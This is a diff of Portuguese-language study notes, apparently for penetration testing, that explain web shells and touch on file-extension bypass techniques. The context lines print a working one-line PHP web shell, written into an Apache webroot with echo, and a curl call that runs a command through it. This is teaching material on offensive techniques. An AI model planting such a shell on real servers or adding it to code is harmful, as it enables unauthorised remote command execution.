@@ -63,17 +63,15 @@ A *Web Shell* normalmente é um script web, ou seja., PHP ou ASPX, que aceita no
 
 Uma vez que temos o nosso shell web, precisamos colocar o nosso script shell web no diretório web do host remoto (webroot) para executar o script através do navegador web.
 
-![image](https://github.com/user-attachments/assets/673c3f82-0817-422c-82f3-6307de7a63bf)
 
 Se fosse um Linux executando Apache por exemplo seria `echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php`, e podemos acessar a web shell pela URL e pelo curl.
 
 curl "http://example.com/shell.php?cmd=whoami"
 
 ---
-Tecnicas de bypass de extensão shell
+
+## Tecnicas de bypass de extensão shell </br>
 <img width="542" height="848" alt="image" src="https://github.com/user-attachments/assets/af956b20-0722-46e8-9d86-e8e386792023" />
-
-
 
 ---
 
